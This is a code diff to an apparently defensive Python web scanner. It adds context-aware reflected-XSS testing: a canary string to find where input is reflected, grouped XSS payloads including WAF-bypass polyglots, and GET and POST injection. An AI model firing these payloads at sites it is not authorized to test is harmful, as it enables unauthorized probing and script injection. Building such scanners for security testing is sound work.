@@ -21,20 +21,27 @@ HEADERS = {
 # -------------------------
 # XSS Payloads
 # -------------------------
-XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "\"><script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "<svg onload=alert(1)>",
-    "javascript:alert(1)",
-    "<iframe src=javascript:alert(1)>",
-    "'><script>alert(1)</script>",
-    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//",  # Polyglot WAF bypass
-    "'\"><img src=x onerror=window.onerror=eval;throw'alert(1)'>",  # Advanced context escape
-    "<body onload=alert(1)>",
-    "<input onfocus=alert(1) autofocus>",
-    "<details open ontoggle=alert(1)>"
-]
+CANARY = "dsgxsscanary1337"
+
+ADVANCED_XSS_PAYLOADS = {
+    "html_text": [
+        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>"
+    ],
+    "attribute_double": [
+        '\"><script>alert(1)</script>', '" autofocus onfocus="alert(1)', '" onmouseover="alert(1)'
+    ],
+    "attribute_single": [
+        "'><script>alert(1)</script>", "' autofocus onfocus='alert(1)", "' onmouseover='alert(1)'"
+    ],
+    "script": [
+        "';alert(1);//", "'-alert(1)-'", "\\\";alert(1);//", "</script><script>alert(1)</script>"
+    ],
+    "polyglots": [
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//", 
+        "'\"><img src=x onerror=window.onerror=eval;throw'alert(1)'>",
+        "\">><marquee><img src=x onerror=confirm(1)></marquee>\"</plaintext\\></|\\><plaintext/onmouseover=prompt(1)>"
+    ]
+}
 
 
 # -------------------------
@@ -224,17 +231,43 @@ def is_executable_context(payload, response_text, param_name=""):
     return False
 
 
-def test_xss(url, parameters):
+def determine_contexts(response_text, canary):
+    """Determine where the canary string reflected in the DOM context."""
+    contexts = set()
+    import re
+    
+    # Check if inside a script tag
+    if re.search(r'<script[^>]*>.*?%s.*?</script>' % canary, response_text, re.I | re.S):
+        contexts.add('script')
+    # Check attribute context (double quote)
+    if re.search(r'=[ \t]*"[^"]*%s[^"]*"' % canary, response_text, re.I):
+        contexts.add('attribute_double')
+    # Check attribute context (single quote)
+    if re.search(r"=[ \t]*'[^']*%s[^']*'" % canary, response_text, re.I):
+        contexts.add('attribute_single')
+    # Check standard HTML text context
+    if re.search(r'>[^<]*%s[^<]*<' % canary, response_text, re.I):
+        contexts.add('html_text')
+        
+    return contexts if contexts else {'unknown'}
+
+
+def test_xss(url, parameters, method='get', data=None):
     """
-    Improved XSS testing with reduced false positives.
-    Tests for actual executable XSS, not just reflection.
+    Advanced Context-Aware XSS testing.
+    1. Injects a canary to discover reflection context.
+    2. Selects targeted payloads for the discovered contexts.
+    3. Validates execution logic avoiding false positives.
     """
     vulnerabilities = []
     
     # Get baseline response to detect error pages
     baseline_response = None
     try:
-        baseline_response = session.get(url, headers=HEADERS, timeout=5)
+        if method.lower() == 'post':
+            baseline_response = session.post(url, data=data or {}, headers=HEADERS, timeout=5)
+        else:
+            baseline_response = session.get(url, headers=HEADERS, timeout=5)
         baseline_status = baseline_response.status_code
         baseline_content_type = baseline_response.headers.get('Content-Type', '')
     except:
@@ -243,16 +276,51 @@ def test_xss(url, parameters):
     
     for param in parameters:
         
-        # Track if we found a vuln for this parameter to avoid duplicates
         found_vuln_for_param = False
         
-        for payload in XSS_PAYLOADS:
+        # Step 1: Canary Injection (Context Discovery)
+        try:
+            if method.lower() == 'post':
+                form_data = {} if data is None else data.copy()
+                form_data[param] = CANARY
+                canary_resp = session.post(url, data=form_data, headers=HEADERS, timeout=5)
+            else:
+                canary_url = build_url(url, param, CANARY)
+                canary_resp = session.get(canary_url, headers=HEADERS, timeout=5)
+
+            if canary_resp.status_code < 400 and CANARY in canary_resp.text:
+                discovered_contexts = determine_contexts(canary_resp.text, CANARY)
+            else:
+                discovered_contexts = {'polyglots'} # Fallback to blind polyglots if canary mutated/filtered
+        except Exception:
+            discovered_contexts = {'polyglots'}
+
+        # Step 2: Select payloads based on context
+        targeted_payloads = []
+        for context in discovered_contexts:
+            if context in ADVANCED_XSS_PAYLOADS:
+                targeted_payloads.extend(ADVANCED_XSS_PAYLOADS[context])
+        
+        # Always include polyglots for comprehensive coverage
+        targeted_payloads.extend(ADVANCED_XSS_PAYLOADS["polyglots"])
+        
+        # Remove duplicates while preserving order
+        targeted_payloads = list(dict.fromkeys(targeted_payloads))
+
+        # Step 3: Payload Injection & Validation
+        for payload in targeted_payloads:
             if found_vuln_for_param:
                 break
                 
             try:
-                test_url = build_url(url, param, payload)
-                response = session.get(test_url, headers=HEADERS, timeout=5)
+                if method.lower() == 'post':
+                    form_data = {} if data is None else data.copy()
+                    form_data[param] = payload
+                    response = session.post(url, data=form_data, headers=HEADERS, timeout=5)
+                    test_url = url
+                else:
+                    test_url = build_url(url, param, payload)
+                    response = session.get(test_url, headers=HEADERS, timeout=5)
                 
                 # Skip if response status indicates error or redirect
                 if response.status_code >= 400:
@@ -282,12 +350,13 @@ def test_xss(url, parameters):
                         continue
                 
                 # All checks passed - likely a real vulnerability
+                context_str = ", ".join(discovered_contexts)
                 vulnerabilities.append({
-                    "type": "Reflected XSS",
+                    "type": f"Reflected XSS (Context: {context_str})",
                     "parameter": param,
                     "payload": payload,
                     "url": test_url,
-                    "explanation": "The XSS payload was reflected in the server's response without proper HTML encoding or sanitization in an executable context, allowing potential script execution.",
+                    "explanation": f"The XSS payload successfully broke out of the '{context_str}' context. It reflected without proper sanitization, allowing script execution.",
                     "severity": "High",
                     "remediation": "Implement output encoding (e.g., HTML entity encoding) or use a library like DOMPurify to sanitize user inputs."
                 })
